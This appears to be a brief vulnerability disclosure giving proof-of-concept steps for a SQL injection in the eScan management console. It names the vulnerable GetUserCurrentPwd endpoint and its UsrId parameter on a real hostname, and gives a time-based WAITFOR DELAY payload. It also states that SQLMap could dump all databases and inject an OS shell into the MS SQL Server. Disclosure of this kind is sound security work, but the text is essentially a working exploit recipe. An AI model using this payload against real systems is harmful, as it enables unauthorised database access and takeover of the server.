*Step of Reproduction/Proof of concept(POC)*

1. Login into the escan management console with a valid username and
password as root user.
2. Navigate to URL:
https://cl.escanav.com/ewconsole/ewconsole.dll/GetUserCurrentPwd?UsrId=1&cnt=4176
3. Inject the payload into the UsrId parameter to confirm the SQL
injection as shown below:
https://cl.escanav.com/ewconsole/ewconsole.dll/GetUserCurrentPwd?UsrId=1;WAITFOR
DELAY '0:0:5'--&cnt=4176
4. The time delay of 5 seconds confirmed that "UsrId" parameter was
vulnerable to SQL Injection. Furthermore, it was also possible to dump
all the databases and inject OS shell directly into the MS SQL Server
using SQLMap tool.
